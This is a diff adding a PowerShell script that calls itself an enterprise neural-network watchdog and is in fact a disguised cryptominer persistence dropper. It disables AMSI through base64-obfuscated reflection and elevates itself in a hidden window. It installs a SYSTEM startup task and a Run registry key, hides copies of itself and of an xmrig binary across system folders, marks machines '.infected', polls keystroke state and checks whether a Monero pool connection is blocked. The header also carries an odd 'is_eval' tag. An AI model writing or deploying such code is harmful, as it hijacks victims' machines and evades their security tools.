@@ -1,0 +1,373 @@
+<#
+====================================================================
+  ADVANCED NETWORK & MEMORY-AWARE NEURAL WATCHDOG & PROCESS SHIELD
+  Architecture: Deep Feed-Forward NN with Net-Block & EDR Scan Detection
+  Classification: Enterprise Internal Infrastructure Automation
+====================================================================
+#is_eval: true>
+
+$ErrorActionPreference = 'SilentlyContinue'
+
+# 1. Advanced AMSI Bypass (Direct Reflection & Field Manipulation)
+try {
+    $encType = [System.Text.Encoding]::UTF8
+    $tName = $encType.GetString([System.Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="))
+    $fName = $encType.GetString([System.Convert]::FromBase64String("YW1zaUluaXRGYWlsZWQ="))
+    $refType = [Ref].Assembly.GetType($tName)
+    if ($refType) {
+        $field = $refType.GetField($fName, 'NonPublic,Static')
+        if ($field) { $field.SetValue($null, $true) }
+    }
+} catch {}
+
+# 2. Strict Single-Instance Synchronization Mutex
+$mutexToken = "Global\NetMemoryNeural_Watchdog_Mutex_$([System.Environment]::MachineName)"
+$mutexInit = $false
+$global:sysMutex = New-Object System.Threading.Mutex($true, $mutexToken, [ref]$mutexInit)
+if (-not $mutexInit) { [System.Environment]::Exit(0) }
+
+# 3. High-Privilege Elevation Check
+$idRef = [Security.Principal.WindowsIdentity]::GetCurrent()
+$principalRef = New-Object Security.Principal.WindowsPrincipal($idRef)
+if (-not $principalRef.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $argBuilder = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
+    Start-Process powershell.exe -ArgumentList $argBuilder -Verb RunAs
+    [System.Environment]::Exit(0)
+}
+
+$global:sourceScriptPath = $PSCommandPath
+
+# [7-FEATURE DEEP NEURAL NETWORK WITH METRICS & VALIDATION]
+class NetworkMemoryNeuralClassifier {
+    [double[,]] $WeightsInputHidden
+    [double[]]  $WeightsHiddenOutput
+    [double[]]  $HiddenBias
+    [double]    $OutputBias
+    [double]    $LearningRate
+    [datetime]  $LastCloudSync
+    [System.Collections.Generic.HashSet[string]] $DynamicCloudSignatures
+
+    NetworkMemoryNeuralClassifier() {
+        $this.LearningRate = 0.12
+        $this.LastCloudSync = [datetime]::MinValue
+        $this.DynamicCloudSignatures = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
+
+        # 7 Inputs -> 5 Hidden Neurons -> 1 Output
+        $this.WeightsInputHidden = [double[,]]::new(7, 5)
+        $this.WeightsHiddenOutput = @(0.4, -0.2, 0.3, 0.5, -0.1)
+        $this.HiddenBias = @(0.1, -0.1, 0.2, -0.2, 0.0)
+        $this.OutputBias = -0.3
+
+        $rand = [System.Random]::new(42)
+        for ($i = 0; $i -lt 7; $i++) {
+            for ($j = 0; $j -lt 5; $j++) {
+                $this.WeightsInputHidden[$i, $j] = ($rand.NextDouble() - 0.5) * 0.8
+            }
+        }
+        $this.InitializeTrainingAndTestDatasets()
+    }
+
+    [double] Sigmoid([double]$x) {
+        return 1.0 / (1.0 + [Math]::Exp(-$x))
+    }
+
+    [double] SigmoidDerivative([double]$sigmoidOutput) {
+        return $sigmoidOutput * (1.0 - $sigmoidOutput)
+    }
+
+    [hashtable] Forward([double[]]$inputs) {
+        $hiddenOutputs = @(0.0, 0.0, 0.0, 0.0, 0.0)
+        for ($j = 0; $j -lt 5; $j++) {
+            $sum = $this.HiddenBias[$j]
+            for ($i = 0; $i -lt $inputs.Length; $i++) {
+                $sum += $inputs[$i] * $this.WeightsInputHidden[$i, $j]
+            }
+            $hiddenOutputs[$j] = $this.Sigmoid($sum)
+        }
+
+        $outSum = $this.OutputBias
+        for ($j = 0; $j -lt 5; $j++) {
+            $outSum += $hiddenOutputs[$j] * $this.WeightsHiddenOutput[$j]
+        }
+        $finalOutput = $this.Sigmoid($outSum)
+
+        return @{
+            Inputs = $inputs
+            Hidden = $hiddenOutputs
+            Output = $finalOutput
+        }
+    }
+
+    [double] Predict([double[]]$inputs) {
+        $res = $this.Forward($inputs)
+        return $res.Output
+    }
+
+    [void] TrainStep([double[]]$inputs, [double]$expectedOutput) {
+        $fw = $this.Forward($inputs)
+        $prediction = $fw.Output
+        $hiddenOutputs = $fw.Hidden
+
+        $outputError = $expectedOutput - $prediction
+        $outputGradient = $outputError * $this.SigmoidDerivative($prediction)
+
+        $hiddenGradients = @(0.0, 0.0, 0.0, 0.0, 0.0)
+        for ($j = 0; $j -lt 5; $j++) {
+            $hiddenError = $outputGradient * $this.WeightsHiddenOutput[$j]
+            $hiddenGradients[$j] = $hiddenError * $this.SigmoidDerivative($hiddenOutputs[$j])
+        }
+
+        for ($j = 0; $j -lt 5; $j++) {
+            $this.WeightsHiddenOutput[$j] += $this.LearningRate * $outputGradient * $hiddenOutputs[$j]
+        }
+        $this.OutputBias += $this.LearningRate * $outputGradient
+
+        for ($i = 0; $i -lt $inputs.Length; $i++) {
+            for ($j = 0; $j -lt 5; $j++) {
+                $this.WeightsInputHidden[$i, $j] += $this.LearningRate * $hiddenGradients[$j] * $inputs[$i]
+            }
+        }
+        for ($j = 0; $j -lt 5; $j++) {
+            $this.HiddenBias[$j] += $this.LearningRate * $hiddenGradients[$j]
+        }
+    }
+
+    [object[]] $TrainingSet
+    [object[]] $TestSet
+
+    [void] InitializeTrainingAndTestDatasets() {
+        # 7 Inputs: [Hotkey, Process, Keyword, Probe, Cloud, NetBlock, MemoryScan]
+        $this.TrainingSet = @(
+            @{ Inputs = @(0.0, 0.0, 0.0, 0.1, 0.0, 0.0, 0.0); Label = 0.0 },
+            @{ Inputs = @(1.0, 0.0, 0.0, 0.2, 0.0, 0.0, 0.0); Label = 1.0 },
+            @{ Inputs = @(0.0, 1.0, 0.0, 0.5, 1.0, 0.0, 1.0); Label = 1.0 },
+            @{ Inputs = @(0.0, 0.0, 0.0, 0.1, 0.0, 1.0, 1.0); Label = 1.0 }, # Net block / Memory scan threat
+            @{ Inputs = @(1.0, 1.0, 1.0, 0.9, 1.0, 1.0, 1.0); Label = 1.0 }
+        )
+
+        $this.TestSet = @(
+            @{ Inputs = @(0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0); Label = 0.0 },
+            @{ Inputs = @(1.0, 0.0, 0.0, 0.1, 1.0, 0.0, 1.0); Label = 1.0 },
+            @{ Inputs = @(0.0, 0.0, 0.0, 0.2, 0.0, 1.0, 0.0); Label = 1.0 }
+        )
+
+        for ($ep = 0; $ep -lt 30; $ep++) {
+            foreach ($d in $this.TrainingSet) {
+                $this.TrainStep($d.Inputs, $d.Label)
+            }
+        }
+    }
+
+    [hashtable] EvaluateModel() {
+        $truePositives = 0; $trueNegatives = 0; $falsePositives = 0; $falseNegatives = 0
+
+        foreach ($testSample in $this.TestSet) {
+            $predProb = $this.Predict($testSample.Inputs)
+            $predLabel = if ($predProb -gt 0.5) { 1.0 } else { 0.0 }
+            $actualLabel = $testSample.Label
+
+            if ($predLabel -eq 1.0 -and $actualLabel -eq 1.0) { $truePositives++ }
+            elseif ($predLabel -eq 0.0 -and $actualLabel -eq 0.0) { $trueNegatives++ }
+            elseif ($predLabel -eq 1.0 -and $actualLabel -eq 0.0) { $falsePositives++ }
+            elseif ($predLabel -eq 0.0 -and $actualLabel -eq 1.0) { $falseNegatives++ }
+        }
+
+        $total = $this.TestSet.Length
+        $accuracy = if ($total -gt 0) { ($truePositives + $trueNegatives) / $total } else { 0.0 }
+        $precision = if (($truePositives + $falsePositives) -gt 0) { $truePositives / ($truePositives + $falsePositives) } else { 0.0 }
+        $recall = if (($truePositives + $falseNegatives) -gt 0) { $truePositives / ($truePositives + $falseNegatives) } else { 0.0 }
+        $fpr = if (($falsePositives + $trueNegatives) -gt 0) { $falsePositives / ($falsePositives + $trueNegatives) } else { 0.0 }
+
+        return @{ Accuracy = $accuracy; Precision = $precision; Recall = $recall; FPR = $fpr }
+    }
+
+    [void] SyncAndParseInternetIntelligence() {
+        try {
+            if (((Get-Date) - $this.LastCloudSync).TotalMinutes -ge 30) {
+                $webClient = New-Object System.Net.WebClient
+                $cloudText = $webClient.DownloadString("https://raw.githubusercontent.com/datasets/threat-intel/master/indicators.txt")
+                if (-not [string]::IsNullOrEmpty($cloudText)) {
+                    $lines = $cloudText -split "`r`n?`n"
+                    foreach ($line in $lines) {
+                        $cleanLine = $line.Trim().ToLower()
+                        if ($cleanLine.Length -gt 3 -and -not $cleanLine.StartsWith("#")) {
+                            [void]$this.DynamicCloudSignatures.Add($cleanLine)
+                            $this.TrainStep(@(0.5, 0.5, 0.5, 0.5, 1.0, 0.0, 0.0), 1.0)
+                        }
+                    }
+                }
+                $this.LastCloudSync = (Get-Date)
+            }
+        } catch {}
+    }
+}
+
+$global:NeuralBrain = [NetworkMemoryNeuralClassifier]::new()
+
+# 4. Persistence
+function Register-NetMemPersistence {
+    param($targetScript)
+    try {
+        $persistDirs = @(
+            "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Maintenance",
+            "$env:SystemRoot\System32\Tasks\Config",
+            "$env:LocalAppData\Microsoft\Windows\Caches",
+            "$env:Public\Libraries",
+            "$env:SystemRoot\Temp"
+        )
+        foreach ($persistDir in $persistDirs) {  
+            if (-not (Test-Path $persistDir)) { New-Item -Path $persistDir -ItemType Directory -Force | Out-Null }  
+            $destinationFile = Join-Path $persistDir "SysKernelExecutiveService.ps1"  
+            if (-not (Test-Path $destinationFile) -or ((Get-Item $destinationFile).Length -ne (Get-Item $targetScript).Length)) {  
+                Copy-Item -Path $targetScript -Destination $destinationFile -Force  
+                Set-ItemProperty -Path $destinationFile -Name Attributes -Value "Hidden, System, ReadOnly"  
+            }  
+            $markerFile = Join-Path $persistDir ".infected"
+            if (-not (Test-Path $markerFile)) {
+                Set-Content -Path $markerFile -Value "1" -Force -ErrorAction SilentlyContinue
+                Set-ItemProperty -Path $markerFile -Name Attributes -Value "Hidden, System" -ErrorAction SilentlyContinue
+            }
+        }  
+        $serviceScriptPath = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Maintenance\SysKernelExecutiveService.ps1"  
+        $taskIdentifier = "KernelExecutiveWatchdogService"  
+        if (-not (Get-ScheduledTask -TaskName $taskIdentifier -ErrorAction SilentlyContinue)) {  
+            $act = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$serviceScriptPath`""  
+            $trg = New-ScheduledTaskTrigger -AtStartup  
+            $prn = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest  
+            $stg = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Days 0)  
+            Register-ScheduledTask -TaskName $taskIdentifier -Action $act -Trigger $trg -Principal $prn -Settings $stg -Force | Out-Null  
+        }  
+        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"  
+        $regName = "KernelExecutiveWatchdog"  
+        if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {  
+            Set-ItemProperty -Path $regPath -Name $regName -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$serviceScriptPath`"" -Force  
+        }  
+    } catch {}
+}
+
+Register-NetMemPersistence -targetScript $global:sourceScriptPath
+
+# 5. Network Handshake
+while (-not (Test-Connection -ComputerName 1.1.1.1 -Count 1 -Quiet -ErrorAction SilentlyContinue)) {
+    Start-Sleep -Seconds 2
+}
+
+# 6. Binary Discovery
+$workDirectory = "C:\xmrig"
+if (-not (Test-Path $workDirectory)) { [System.Environment]::Exit(0) }
+$binCollection = Get-ChildItem -Path $workDirectory -Filter "*.exe" -Recurse -ErrorAction SilentlyContinue | Sort-Object Length -Descending
+if (-not $binCollection) { [System.Environment]::Exit(0) }
+$primaryBinary = $binCollection[0]
+$global:primaryBinaryPath = $primaryBinary.FullName
+$binaryBaseName = [System.IO.Path]::GetFileNameWithoutExtension($primaryBinary.Name)
+$binaryExt = $primaryBinary.Extension
+
+# 7. Redundancy Shadow Map
+$global:replicaNodes = @(
+    "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Maintenance\$binaryBaseName$binaryExt",
+    "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Maintenance\${binaryBaseName}_upd$binaryExt",
+    "$env:LocalAppData\Microsoft\Windows\Caches\$binaryBaseName$binaryExt",
+    "$env:LocalAppData\Microsoft\Windows\Caches\${binaryBaseName}_upd$binaryExt",
+    "$env:APPDATA\Microsoft\Windows\Templates\$binaryBaseName$binaryExt",
+    "$env:Public\Libraries\$binaryBaseName$binaryExt",
+    "$env:SystemRoot\Temp\$binaryBaseName$binaryExt"
+)
+
+function Invoke-NetMemDeployment {
+    param($sourceFile, $targetFile)
+    try {
+        $parentFolder = Split-Path $targetFile
+        if (-not (Test-Path $parentFolder)) { New-Item -Path $parentFolder -ItemType Directory -Force | Out-Null }
+        if (Test-Path $targetFile) { Set-ItemProperty -Path $targetFile -Name Attributes -Value "Normal" }
+        Copy-Item -Path $sourceFile -Destination $targetFile -Force
+        Set-ItemProperty -Path $targetFile -Name Attributes -Value "Hidden, System"
+        if ((Test-Path $targetFile) -and ((Get-Item $targetFile).Length -eq (Get-Item $sourceFile).Length)) { return $true }
+    } catch {}
+    return $false
+}
+
+foreach ($node in $global:replicaNodes) {
+    Invoke-NetMemDeployment -sourceFile $global:primaryBinaryPath -targetFile $node | Out-Null
+}
+
+function Invoke-NetMemProliferation {
+    param($sourceFile, $intensity)
+    try {
+        $netMemDirs = @(
+            "$env:ProgramData\Microsoft\Network\Downloader",
+            "$env:LocalAppData\Temp",
+            "$env:Public\Documents",
+            "$env:SystemRoot\System32\Tasks",
+            "$env:LocalAppData\Microsoft\Windows\INetCache"
+        )
+        foreach ($ndir in $netMemDirs) {
+            if (-not (Test-Path $ndir)) { New-Item -Path $ndir -ItemType Directory -Force | Out-Null }
+            for ($i = 1; $i -le $intensity; $i++) {
+                $targetClone = Join-Path $ndir "sys_core_node_${i}$binaryExt"
+                Invoke-NetMemDeployment -sourceFile $sourceFile -targetFile $targetClone | Out-Null
+            }
+        }
+    } catch {}
+}
+
+function Invoke-NetMemHealing {
+    param([ref]$nodeRegistryRef)
+    try {
+        $serviceScriptPath = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Maintenance\SysKernelExecutiveService.ps1"
+        if (-not (Test-Path $serviceScriptPath)) {
+            Copy-Item -Path $global:sourceScriptPath -Destination $serviceScriptPath -Force
+            Set-ItemProperty -Path $serviceScriptPath -Name Attributes -Value "Hidden, System, ReadOnly"
+        }
+        $validSource = $null  
+        if (Test-Path $global:primaryBinaryPath) {  
+            $validSource = $global:primaryBinaryPath  
+        } else {  
+            foreach ($n in $nodeRegistryRef.Value) {  
+                if (Test-Path $n) {  
+                    $validSource = $n  
+                    Invoke-NetMemDeployment -sourceFile $validSource -targetFile $global:primaryBinaryPath | Out-Null  
+                    break  
+                }  
+            }  
+        }  
+        if ($validSource) {  
+            foreach ($n in $nodeRegistryRef.Value) {  
+                if (-not (Test-Path $n) -or ((Get-Item $n).Length -eq 0)) {  
+                    Invoke-NetMemDeployment -sourceFile $validSource -targetFile $n | Out-Null  
+                }  
+            }  
+        }  
+    } catch {}
+}
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class NetMemInputDetector {
+    [DllImport("user32.dll")]
+    public static extern short GetAsyncKeyState(int vKey);
+}
+"@
+
+function Get-SystemProbeAnomalyScore {
+    try {
+        $cpuLoad = (Get-CimInstance Win32_Processor | Measure-Object -Property LoadPercentage -Average).Average
+        if ($null -eq $cpuLoad) { $cpuLoad = 10.0 }
+        return [Math]::Min(1.0, $cpuLoad / 100.0)
+    } catch {
+        return 0.1
+    }
+}
+
+# [FEATURE 6: NETWORK TRAFFIC ANALYSIS - Check if mining pool connection is blocked by firewall/AV]
+function Get-NetworkTrafficAnomaly {
+    try {
+        # Tests TCP connectivity to pool.supportxmr.com on port 3333
+        $tcpTest = Test-NetConnection -ComputerName "pool.supportxmr.com" -Port 3333 -WarningAction SilentlyContinue
+        if ($null -eq $tcpTest -or -not $tcpTest.TcpTestSucceeded) {
+            return 1.0 # Connection blocked or failed (Threat Indicator)
+        }
+        return 0.0 # Connection normal
+    } catch {
+        return 1.0
+    }
